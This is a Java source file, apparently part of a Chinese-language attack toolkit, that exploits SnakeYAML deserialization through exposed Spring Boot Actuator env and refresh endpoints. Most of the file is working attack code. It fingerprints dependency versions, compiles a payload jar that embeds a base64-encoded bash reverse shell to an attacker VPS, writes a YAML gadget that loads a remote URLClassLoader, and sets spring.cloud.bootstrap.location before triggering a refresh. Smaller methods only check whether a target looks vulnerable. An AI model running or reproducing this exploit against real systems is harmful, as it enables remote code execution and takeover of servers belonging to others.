package src.main.module;

import src.main.common.HTTPConfig;
import src.main.loadlib.ClassCom.ClsComp;
import src.main.loadlib.JARLoad.LoadJarLib;
import src.main.impl.ResultCallback;

import java.io.*;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.ssl.sslVer.disableSSLVerification;

public class SnakeYamlRCE {
    private String address;
    private String vpsIP;
    public String text;
    private boolean isPoc;
    public static  int count= 9950;
    public static  int count1 = 0;

    public String ymlpayload = "!!javax.script.ScriptEngineManager [\n" +
            "  !!java.net.URLClassLoader [[\n" +
            "    !!java.net.URL [\"http://127.0.0.1/SnakeYaml%d.jar\"]\n" +
            "  ]]\n" +
            "]";
    public String cmdtmp = "bash -i >& /dev/tcp/%s/%d 0>&1";
    public String expdata1 = "spring.cloud.bootstrap.location=http://%s/SnakeYamlYml.yml";
    public String expdata2 = "{\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://%s/SnakeYamlYml.yml\"}";
    public SnakeYamlRCE(String address, String vpsIP){
        this.address = address;
        this.vpsIP = vpsIP;
    }
    public SnakeYamlRCE(String address,boolean isPoc){
        this.address = address;
        this.isPoc = isPoc;
    }


    public void Result1(ResultCallback callback){
        String site = address + "/env";
        String llib = "spring-boot-starter-actuator";
        String llib1 = "spring-cloud-starter";
        String data = "";
        String ref = "/refresh";
        String refsite = address + ref;
        disableSSLVerification();
        try{
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK || (responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR && count!=0)){
                InputStream inputStream = (responseCode == HttpURLConnection.HTTP_OK) ? conn.getInputStream() : conn.getErrorStream();
                BufferedReader in = new BufferedReader(new InputStreamReader(inputStream));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                if ((response.toString().contains(llib) && response.toString().contains(llib1)) || count != 0){
                    String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(response.toString());
                    String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                    Pattern pattern1 = Pattern.compile(regex1);
                    Matcher matcher1 = pattern1.matcher(response.toString());
                    if (matcher.find() && matcher1.find()) {
                        text = String.format("spring-boot-starter-actuator 依赖为: %s", matcher.group(1));
                        callback.onResult(text);
                        text = String.format("spring-cloud-starter 依赖为: %s", matcher1.group(1));
                        callback.onResult(text);
                        String b64p = Base64.getEncoder().encodeToString(String.format(cmdtmp,vpsIP,count).getBytes());
                        ClsComp cc = new ClsComp(b64p);
                        boolean isModify = cc.modifyJavaClassFile("YAMLObject/SnakeYamlTemplate.java","SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory.java",callback);
                        if (isModify){
                            try {
                                cc.CompileJava("/SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory", "/SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory", callback);
                            } catch (IOException e) {
                                return;
                            }
                            LoadJarLib lb = new LoadJarLib("SnakeYaml" + count1);
                            lb.loadJar(callback);
                            // 使用 String.format 格式化字符串
                            String formattedString = String.format(ymlpayload,count1);

                            try (BufferedWriter writer = new BufferedWriter(new FileWriter(System.getProperty("user.dir") + "/resources/SnakeYamlYml.yml"))) {
                                writer.write(formattedString);
                                text = "yml文件重写成功";
                                callback.onResult(text);
                            } catch (IOException e) {
                                text = "yml文件重写失败";
                                callback.onResult(text);
                                e.printStackTrace();
                            }
                            data = String.format(expdata1,vpsIP);
                            HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                            conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                            conn1.setRequestMethod("POST");
                            conn1.setDoOutput(true);
                            try (OutputStream os = conn1.getOutputStream()) {
                                byte[] input = data.getBytes(StandardCharsets.UTF_8);
                                os.write(input, 0, input.length);
                            }
                            int responseCode1 = conn1.getResponseCode();
                            if (responseCode1 == HttpURLConnection.HTTP_OK){
                                try{
                                    HttpURLConnection conn2 = HTTPConfig.createConnection(refsite);
                                    conn2.setRequestMethod("POST");
                                    conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                                    conn2.setDoOutput(true);
                                    int responseCode2 = conn2.getResponseCode();
                                    if (responseCode2 == HttpURLConnection.HTTP_OK){
                                        text = "执行命令成功";
                                        callback.onResult(text);
                                        text = "当前反弹vpsIP: " + vpsIP + " " + "vpsPort: 9950";
                                        callback.onResult(text);
                                        count ++;
                                    }else{
                                        text = "错误：发送refresh请求失败，状态码为: " + responseCode2;
                                        callback.onResult(text);
                                    }
                                }catch (Exception e){
                                    text = "异常：发起refresh请求失败";
                                    callback.onResult(text);
                                    e.printStackTrace();
                                }
                            }
                        }else{
                            text = "生成jar包失败";
                            callback.onResult(text);
                        }
                    }else if (count != 0){
                        String b64p = Base64.getEncoder().encodeToString(String.format(cmdtmp,vpsIP,count).getBytes());
                        ClsComp cc = new ClsComp(b64p);
                        boolean isModify = cc.modifyJavaClassFile("YAMLObject/SnakeYamlTemplate.java","SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory.java",callback);
                        if (isModify){
                            try {
                                cc.CompileJava("/SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory", "/SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory", callback);
                            } catch (IOException e) {
                                return;
                            }
                            LoadJarLib lb = new LoadJarLib("SnakeYaml" + count1);
                            lb.loadJar(callback);
                            // 使用 String.format 格式化字符串
                            String formattedString = String.format(ymlpayload,count1);

                            try (BufferedWriter writer = new BufferedWriter(new FileWriter(System.getProperty("user.dir") + "/resources/SnakeYamlYml.yml"))) {
                                writer.write(formattedString);
                                text = "yml文件重写成功";
                                callback.onResult(text);
                            } catch (IOException e) {
                                text = "yml文件重写失败";
                                callback.onResult(text);
                                e.printStackTrace();
                            }
                            data = String.format(expdata1,vpsIP);
                            HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                            conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                            conn1.setRequestMethod("POST");
                            conn1.setDoOutput(true);
                            try (OutputStream os = conn1.getOutputStream()) {
                                byte[] input = data.getBytes(StandardCharsets.UTF_8);
                                os.write(input, 0, input.length);
                            }
                            int responseCode1 = conn1.getResponseCode();
                            if (responseCode1 == HttpURLConnection.HTTP_OK){
                                try{
                                    HttpURLConnection conn2 = HTTPConfig.createConnection(refsite);
                                    conn2.setRequestMethod("POST");
                                    conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                                    conn2.setDoOutput(true);
                                    int responseCode2 = conn2.getResponseCode();
                                    if (responseCode2 == HttpURLConnection.HTTP_OK){
                                        text = "执行命令成功";
                                        callback.onResult(text);
                                        text = "当前反弹vpsIP: " + vpsIP + " " + "vpsPort: 9950";
                                        callback.onResult(text);
                                        count ++;
                                    }else{
                                        text = "错误：发送refresh请求失败，状态码为: " + responseCode2;
                                        callback.onResult(text);
                                    }
                                }catch (Exception e){
                                    text = "异常：发起refresh请求失败";
                                    callback.onResult(text);
                                    e.printStackTrace();
                                }
                            }
                        }else{
                            text = "生成jar包失败";
                            callback.onResult(text);
                        }
                    }else{
                        text = "未找到依赖";
                        callback.onResult(text);
                    }
                }else {
                    text = "发送env请求失败";
                    callback.onResult(text);
                }
            }else{
                text = "检测服务器状态异常";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result2(ResultCallback callback){
        String site = address + "/actuator/env";
        String llib = "spring-boot-starter-actuator";
        String llib1 = "spring-cloud-starter";
        String data = "";
        String ref = "/actuator/refresh";
        String refsite = address + ref;
        disableSSLVerification();
        try{
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib) && response.toString().contains(llib1)) {
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = String.format("spring-boot-starter-actuator 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring-cloud-starter 依赖为: %s", matcher1.group(1));
                    callback.onResult(text);
                    String b64p = Base64.getEncoder().encodeToString(String.format(cmdtmp,vpsIP).getBytes());
                    ClsComp cc = new ClsComp(b64p);
                    boolean isModify = cc.modifyJavaClassFile("/YAMLObject/SnakeYamlTemplate.java","SnakeYaml.java",callback);
                    if (isModify){
                        cc.CompileJava("SnakeYaml","SnakeYaml",callback);
                        LoadJarLib lb = new LoadJarLib("SnakeYaml");
                        lb.loadJar(callback);
                        Files.delete(Paths.get(System.getProperty("user.dir") + "/resources/SnakeYaml.java"));
                        Files.delete(Paths.get(System.getProperty("user.dir") + "/resources/SnakeYaml.class"));
                        data = String.format(expdata2,vpsIP);
                        HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                        conn1.setRequestProperty("Content-Type","application/json");
                        conn1.setRequestMethod("POST");
                        conn1.setDoOutput(true);
                        try (OutputStream os = conn1.getOutputStream()) {
                            byte[] input = data.getBytes(StandardCharsets.UTF_8);
                            os.write(input, 0, input.length);
                        }
                        int responseCode1 = conn1.getResponseCode();
                        if (responseCode1 == HttpURLConnection.HTTP_OK){
                            try{
                                HttpURLConnection conn2 = HTTPConfig.createConnection(refsite);
                                conn2.setRequestMethod("POST");
                                conn2.setRequestProperty("Content-Type","application/json");
                                conn2.setDoOutput(true);
                                int responseCode2 = conn2.getResponseCode();
                                if (responseCode2 == HttpURLConnection.HTTP_OK){
                                    text = "执行命令成功";
                                    callback.onResult(text);
                                    text = "当前反弹vpsIP: " + vpsIP + " " + "vpsPort: 9950";
                                    callback.onResult(text);
                                }else{
                                    text = "错误：发送refresh请求失败，状态码为: " + responseCode2;
                                    callback.onResult(text);
                                }
                            }catch (Exception e){
                                text = "异常：发起refresh请求失败";
                                callback.onResult(text);
                                e.printStackTrace();
                            }
                        }
                    }else{
                        text = "生成jar包失败";
                        callback.onResult(text);
                    }
                }else{
                    text = "未找到依赖";
                    callback.onResult(text);
                }
            }else {
                text = "发送env请求失败";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }

    public void Result3(ResultCallback callback){
        String site = address + "/env";
        String llib = "spring-boot-starter-actuator";
        String llib1 = "spring-cloud-starter";
        disableSSLVerification();
        try {
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK || (responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR && count != 0)) {
                InputStream inputStream = (responseCode == HttpURLConnection.HTTP_OK) ? conn.getInputStream() : conn.getErrorStream();
                BufferedReader in = new BufferedReader(new InputStreamReader(inputStream));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                if ((response.toString().contains(llib) && response.toString().contains(llib1)) || count != 0) {
                    String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(response.toString());
                    String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                    Pattern pattern1 = Pattern.compile(regex1);
                    Matcher matcher1 = pattern1.matcher(response.toString());
                    if (matcher.find() && matcher1.find()) {
                        text = String.format("spring-boot-starter-actuator 依赖为: %s", matcher.group(1));
                        callback.onResult(text);
                        text = String.format("spring-cloud-starter 依赖为: %s", matcher1.group(1));
                        callback.onResult(text);
                        HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                        conn1.setDoOutput(true);
                        conn1.setRequestMethod("GET");
                        int responseCode1 = conn1.getResponseCode();
                        BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                        String inputLine1;
                        StringBuilder response1 = new StringBuilder();
                        while ((inputLine1 = in1.readLine()) != null) {
                            response1.append(inputLine1);
                        }
                        in1.close();
                        if (responseCode1 == HttpURLConnection.HTTP_OK &&(response1.toString().contains("/refresh")) && matcher1.group(1).compareTo("1.3.0") < 0 && !matcher.group(1).isEmpty()){
                            text = "可能存在漏洞";
                            callback.onResult(text);
                        }else {
                            text = "不存在可利用漏洞";
                            callback.onResult(text);
                        }
                    }
                }
            }
        }catch (Exception e){
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result4(ResultCallback callback){
        String site = address + "/actuator/env";
        String llib = "spring-boot-starter-actuator";
        String llib1 = "spring-cloud-starter";
        disableSSLVerification();
        try {
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK || (responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR && count != 0)) {
                InputStream inputStream = (responseCode == HttpURLConnection.HTTP_OK) ? conn.getInputStream() : conn.getErrorStream();
                BufferedReader in = new BufferedReader(new InputStreamReader(inputStream));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                if ((response.toString().contains(llib) && response.toString().contains(llib1)) || count != 0) {
                    String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(response.toString());
                    String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                    Pattern pattern1 = Pattern.compile(regex1);
                    Matcher matcher1 = pattern1.matcher(response.toString());
                    if (matcher.find() && matcher1.find()) {
                        text = String.format("spring-boot-starter-actuator 依赖为: %s", matcher.group(1));
                        callback.onResult(text);
                        text = String.format("spring-cloud-starter 依赖为: %s", matcher1.group(1));
                        callback.onResult(text);
                        HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                        conn1.setDoOutput(true);
                        conn1.setRequestMethod("GET");
                        int responseCode1 = conn1.getResponseCode();
                        BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                        String inputLine1;
                        StringBuilder response1 = new StringBuilder();
                        while ((inputLine1 = in1.readLine()) != null) {
                            response1.append(inputLine1);
                        }
                        in1.close();
                        if (responseCode1 == HttpURLConnection.HTTP_OK &&(response1.toString().contains("/refresh")) && matcher1.group(1).compareTo("1.3.0") < 0 && !matcher.group(1).isEmpty()){
                            text = "可能存在漏洞";
                            callback.onResult(text);
                        }else {
                            text = "不存在可利用漏洞";
                            callback.onResult(text);
                        }
                    }
                }
            }
        }catch (Exception e){
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Exp(ResultCallback callback) throws IOException {
        String api ="/actuator/env";
        String site = address + api;
        try{
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 存在路径是springboot2，否则是springboot1
                text = "当前版本为springboot2";
                callback.onResult("当前版本为springboot2");
                if (isPoc && vpsIP == null){
                    Result4(callback);
                }else{
                    Result2(callback);
                }
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                callback.onResult("当前版本为springboot1");
                if (isPoc && vpsIP == null){
                    Result3(callback);
                }else{
                    Result1(callback);
                }
            }else{
                callback.onResult("未识别springboot版本");
            }
        }catch (IOException e){
            text = "检测springboot版本异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
}
